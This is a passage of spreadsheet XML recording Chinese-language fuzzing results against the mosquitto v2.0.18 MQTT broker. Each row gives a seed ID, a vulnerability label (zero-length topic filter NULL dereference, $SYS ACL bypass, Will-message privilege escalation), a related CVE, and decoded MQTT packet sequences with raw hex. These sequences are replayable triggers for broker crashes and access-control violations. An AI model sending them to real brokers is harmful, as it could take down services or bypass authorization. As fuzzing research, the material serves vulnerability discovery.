      </c>
      <c r="J40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0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07">
      <c r="A407" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B407" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C407" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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407" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0246 ===\u000a大小: 1096B (报告+请求数据)\u000a请求数据: 223B\u000a\u000a---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MQTT请求序列(223B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0403000404\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1c040404e503\u000aMsg[3]: SUBSCRIBE PacketID=54 Topics=[''(零长度!QoS=1)] | raw_header=8228003600000d2473686172652f6772\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=139B | raw_header=34a0010013245359532f62726f6b6572\u000aMsg[5]: AUTH  | raw_header=f403040404\u000aMsg[6]: (不完整,2B) raw=80ab\u000a(尾部2B): 80ab</f>
        <v/>
      </c>
      <c r="F4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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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0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08">
      <c r="A408" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B408" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C408" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(129B)\u000a4.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0x02c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E408" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 1321B (报告+请求数据)\u000a请求数据: 129B\u000a\u000a---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MQTT请求序列(129B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(65526B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003cfff66166\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[3]: PUBLISH Topic='test/data' QoS=2 retain=False payload='\x00\x02hello' | raw_header=34120009746573742f64617461000268\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=0200\u000aMsg[6]: PUBREL PacketID=2 | raw_header=62020002\u000aMsg[7]: PUBCOMP  | raw_header=7001ff\u000aMsg[8]: SUBSCRIBE PacketID=4455 Topics=['a/b/c/d/e'(QoS=0), ''(零长度!QoS=0)] | raw_header=821111670009612f622f632f642f6500\u000aMsg[9]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=0 retain=True payload='\x96\x19Ëw¼' | raw_header=3123001c2473686172652f67332f686f\u000aMsg[10]: (不完整,6B) raw=fea2c000e000\u000a(尾部6B): fea2c000e000</f>
        <v/>
      </c>
      <c r="F4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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J40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0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09">
      <c r="A409" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B409" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C409" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(166B)\u000a4.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409" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 1418B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MQTT请求序列(166B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=209 Topics=[''(零长度!QoS=0)] | raw_header=823500d10000000a0014247368617265\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=86B | raw_header=336b0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=ff68\u000a(尾部2B): ff68</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J40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0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10">
      <c r="A410" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0344</t>
        </is>
      </c>
      <c r="B410" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C410" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(126B)\u000a4.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10" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0344 ===\u000a大小: 975B (报告+请求数据)\u000a请求数据: 126B\u000a\u000a---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MQTT请求序列(126B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v251 ClientID=''(128B) clean_session=True keepalive=0s Will=YES [自动清理会话] | raw_header=101500044d515454fb7f000000008066\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b00010000406573742fa21c\u000aMsg[3]: TYPE0  | raw_header=00c50000142473686172652f67727032\u000aMsg[4]: TYPE0  | raw_header=0002a20a\u000aMsg[5]: TYPE0  | raw_header=0003000674\u000aMsg[6]: (不完整,9B) raw=6573742f23c000e000\u000a(尾部9B): 6573742f23c000e000</f>
        <v/>
      </c>
      <c r="F4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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J41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1">
      <c r="A411" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0345</t>
        </is>
      </c>
      <c r="B411" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C411" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(204B)\u000a4.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0x0345\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E411" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0345 ===\u000a大小: 1106B (报告+请求数据)\u000a请求数据: 204B\u000a\u000a---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MQTT请求序列(204B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101500044d5154540480000000008066\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[3]: PUBLISH Topic='test/data' QoS=2 retain=False payload='\x00\x02bello' | raw_header=34120009746573742f64617461000262\u000aMsg[4]: SUBSCRIBE PacketID=153 Topics=['home\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'(QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=825100990012686f6d65000000000000\u000aMsg[5]: PUBLISH Topic='sensor/\x10\x16\x00\x04' QoS=1 retain=False payload='MQTT\x04\x02\x007\x00\u000agen_v5_pubÆvßA¯ò&lt;Ã×n°@\x14\x1cÝê\x087£³' | raw_header=3a35000b73656e736f722f101600044d\u000aMsg[6]: PUBREC  | raw_header=5000\u000aMsg[7]: PUBREL PacketID=2 | raw_header=62020002\u000aMsg[8]: PUBCOMP PacketID=2 | raw_header=70020002</f>
        <v/>
      </c>
      <c r="F4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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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2">
      <c r="A412" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:03c4</t>
        </is>
      </c>
      <c r="B412" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C412" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(151B)\u000a4.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12" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c4 ===\u000a大小: 1075B (报告+请求数据)\u000a请求数据: 151B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: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MQTT请求序列(151B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c00000000\u000aMsg[2]: SUBSCRIBE PacketID=32513 Topics=[''(零长度!QoS=0)] | raw_header=820b7f01000034120009746573\u000aMsg[3]: PUBCOMP PacketID=25664 | raw_header=742f64407461000268656c6c6f4b0200\u000aMsg[4]: CONNACK  | raw_header=2b00\u000aMsg[5]: (不完整,64B) raw=0a746573742f746f70696306604dc78ea1ea3280bda874a7a20d493709985f0f763bcbc05433a07e\u000a(尾部64B): 0a746573742f746f70696306604dc78ea1ea3280bda874a7a20d493709985f0f763bcbc05433a07edbe80002520200020002</f>
        <v/>
      </c>
      <c r="F4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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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3">
      <c r="A413" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:03c5</t>
        </is>
      </c>
      <c r="B413" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C413" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(29538B)\u000a4.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0x03c5\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E413" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c5 ===\u000a大小: 5066B (报告+请求数据)\u000a请求数据: 29538B\u000a\u000a---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MQTT请求序列(29538B原始二进制) ---\u000aMsg[1]: CONNECT Proto=\x00\x00\x00\x00 v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10150004000000000000000000000000\u000aMsg[2]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=820b0000000010000074014700\u000aMsg[3]: TYPE0  | raw_header=0d6d6266757a7a65725f682d73706563\u000aMsg[4]: PUBREL PacketID=30313 | raw_header=64657669636500800000656c656d6574\u000aMsg[5]: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raw_header=0000\u000a(尾部3886B): 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</f>
        <v/>
      </c>
      <c r="F4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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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4">
      <c r="A414" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:03c6</t>
        </is>
      </c>
      <c r="B414" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C414" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000009,sev:4,cat:03c6)中的REQUEST DATA提取出来(78B)\u000a4.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0x03c6\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E414" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c6 ===\u000a大小: 3899B (报告+请求数据)\u000a请求数据: 78B\u000a\u000a---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MQTT请求序列(78B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=26880s Will=YES [自动清理会话] | raw_header=102b00044d515454040669000000215f\u000aMsg[2]: (不完整,33B) raw=74696d5a0206a2150005001173656e736f722f74656d702f7200000064c000e000\u000a(尾部33B): 74696d5a0206a2150005001173656e736f722f74656d702f7200000064c000e000</f>
        <v/>
      </c>
      <c r="F4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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J41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15">
      <c r="A415" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000001,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B415" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C415" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000001,sev:3,cat:0002)中的REQUEST DATA提取出来(206B)\u000a4.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5" s="2">
        <f>== 种子标识: id:000001,sev:3,cat:0002 ===\u000a大小: 551B (报告+请求数据)\u000a请求数据: 206B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(206B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v21 ClientID=''(7540B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=105500044d51545415c6003c001d7421\u000aMsg[2]: PUBREL PacketID=29545 | raw_header=657273696f6e00022d2399fa08001224\u000aMsg[3]: (不完整,3B) raw=615373\u000a(尾部3B): 615373</f>
        <v/>
      </c>
      <c r="F4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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J41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1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16">
      <c r="A416" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000002,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B416" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C416" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000002,sev:3,cat:0002)中的REQUEST DATA提取出来(330B)\u000a4.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6" s="2">
        <f>== 种子标识: id:000002,sev:3,cat:0002 ===\u000a大小: 675B (报告+请求数据)\u000a请求数据: 330B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(330B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v29 ClientID=''(11619B) clean_session=False keepalive=25971s Will=YES [持久会话] | raw_header=105500044d5154541d746573742d636c\u000aMsg[2]: CONNACK session_present=101 reason_code=118 | raw_header=2f6c6576656c322f6c6576656c332f6c\u000aMsg[3]: TYPE0  | raw_header=001c2473686172652f67332f686f6d65\u000aMsg[4]: TYPE0  | raw_header=000d2473686172652f677270312f23\u000aMsg[5]: (不完整,88B) raw=74ef85c7fb12725637a30c8086cfb1a110524e5508045d783e75e71d93165c0806e2cf01f441572b\u000a(尾部88B): 74ef85c7fb12725637a30c8086cfb1a110524e5508045d783e75e71d93165c0806e2cf01f441572be464ab6b335d0c43af5b</f>
        <v/>
      </c>
      <c r="F4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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J41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1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17">
      <c r="A417" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000003,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B417" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C417" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000003,sev:4,cat:0040)中的REQUEST DATA提取出来(9B)\u000a4.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17" s="2">
        <f>== 种子标识: id:000003,sev:4,cat:0040 ===\u000a大小: 384B (报告+请求数据)\u000a请求数据: 9B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(9B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4096 Topics=[''(零长度!QoS=0)] | raw_header=820610000000000b\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e4</f>
        <v/>
      </c>
      <c r="F4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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J41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8">
      <c r="A418" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000003,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B418" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C418" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000003,sev:4,cat:00c0)中的REQUEST DATA提取出来(99B)\u000a4.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18" s="2">
        <f>== 种子标识: id:000003,sev:4,cat:00c0 ===\u000a大小: 662B (报告+请求数据)\u000a请求数据: 99B\u000a\u000a---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MQTT请求序列(99B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1139 Topics=[''(零长度!QoS=2), ''(零长度!QoS=0), 'home/+/temperature'(QoS=2)] | raw_header=821d04730000020000000012686f6d65\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=1 retain=True payload='\x04tY¹ø!r9RÌ#Þ°Jn\x16²¥' | raw_header=3b3f002b766572792f646565702f746f\u000aMsg[3]: (不完整,3B) raw=820600\u000a(尾部3B): 820600</f>
        <v/>
      </c>
      <c r="F4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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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1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19">
      <c r="A419" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000004,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B419" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C419" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000004,sev:3,cat:0002)中的REQUEST DATA提取出来(268B)\u000a4.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9" s="2">
        <f>== 种子标识: id:000004,sev:3,cat:0002 ===\u000a大小: 613B (报告+请求数据)\u000a请求数据: 268B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(268B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(130B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=105500044d51545404c6003c00823b00\u000aMsg[2]: PUBREL PacketID=12150 | raw_header=65722f76657273696f6e000842256edb\u000aMsg[3]: (不完整,65B) raw=0966757a7a5f75736572000966757a7a5f706173734077696c6c2f746f706963006477696c6c5f6d\u000a(尾部65B): 0966757a7a5f75736572000966757a7a5f706173734077696c6c2f746f706963006477696c6c5f6d7367000966757af8fa30</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J41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1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20">
      <c r="A420" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000004,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B420" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C420" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(202B)\u000a4.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0" s="2">
        <f>== 种子标识: id:000004,sev:4,cat:0040 ===\u000a大小: 579B (报告+请求数据)\u000a请求数据: 202B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(202B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[] | raw_header=820600044d515454\u000aMsg[2]: TYPE0  | raw_header=0402003c\u000aMsg[3]: TYPE0  | raw_header=000766757a7a5f6331\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=821b00010000000000742f2300300d00\u000aMsg[5]: TYPE0  | raw_header=0200\u000aMsg[6]: (不完整,150B) raw=01c0823b000b1d0ba7bd9e0e2600062b2f64617461000d2473686172652f677270312f2300017411\u000a(尾部150B): 01c0823b000b1d0ba7bd9e0e2600062b2f64617461000d2473686172652f677270312f230001741100142473686172652f67</f>
        <v/>
      </c>
      <c r="F4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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J42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21">
      <c r="A421" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000004,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B421" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C421" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000004,sev:4,cat:00c0)中的REQUEST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21" s="2">
        <f>== 种子标识: id:000004,sev:4,cat:00c0 ===\u000a大小: 630B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MQTT请求序列(67B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4405 Topics=[''(零长度!QoS=1), 't'(QoS=0), ''(零长度!QoS=0)] | raw_header=820c113500000100017400000000\u000aMsg[2]: PUBLISH Topic='$share/grp1/#' QoS=2 retain=True payload='\x116{¼*ô\x16\x14|\x8c7i\x18Ï\x9d¾¯GCÈ\x82]¨[&amp;âË.-' | raw_header=3d2c000d2473686172652f677270312f\u000aMsg[3]: (不完整,7B) raw=00858585858502\u000a(尾部7B): 00858585858502</f>
        <v/>
      </c>
      <c r="F4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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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22">
      <c r="A422" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000005,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B422" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C422" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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2" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0040 ===\u000a大小: 431B (报告+请求数据)\u000a请求数据: 55B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(55B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[] | raw_header=820600044d515454\u000aMsg[2]: PUBCOMP PacketID=60 | raw_header=7502003c\u000aMsg[3]: TYPE0  | raw_header=000766757a7a5f6340\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b00010000000100000c0000\u000aMsg[5]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=320f00c000068565737c2f00000a776f\u000aMsg[6]: (不完整,4B) raw=6c6440ff\u000a(尾部4B): 6c6440ff</f>
        <v/>
      </c>
      <c r="F4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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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23">
      <c r="A423" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000005,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B423" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C423" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(311B)\u000a4.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423" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0244 ===\u000a大小: 852B (报告+请求数据)\u000a请求数据: 311B\u000a\u000a---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MQTT请求序列(311B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=256 Topics=[''(零长度!QoS=0)] | raw_header=8206010000005454\u000aMsg[2]: TYPE0  | raw_header=0402003c\u000aMsg[3]: TYPE0  | raw_header=000766757a7a5f6332\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=1)] | raw_header=820b00010006746573742f2301\u000aMsg[5]: PUBLISH Topic='test/b' QoS=1 retain=False payload='\x00\u000aworld' | raw_header=320f0006746573742f62000a776f726c\u000aMsg[6]: PUBACK PacketID=130 | raw_header=40020082\u000aMsg[7]: PUBACK  | raw_header=4500\u000aMsg[8]: AUTH  | raw_header=f8140bfe9bf40e260000000a74657374\u000aMsg[9]: TYPE0  | raw_header=000b73656e736f722f74656d70\u000aMsg[10]: TYPE0  | raw_header=0800\u000aMsg[11]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1d245359532f62726f6b65722f636c69\u000aMsg[12]: PUBCOMP PacketID=12132 | raw_header=72792f646565702f746f7069632f6c65\u000aMsg[13]: (不完整,56B) raw=6e6e6563746564d512267d3ce7c0ef9a07bda291607b4d2349b129a10bc6245aef19b9da0b67af1e\u000a(尾部56B): 6e6e6563746564d512267d3ce7c0ef9a07bda291607b4d2349b129a10bc6245aef19b9da0b67af1e8d2c5a74ec490ef406b0</f>
        <v/>
      </c>
      <c r="F4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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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24">
      <c r="A424" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B424" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C424" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
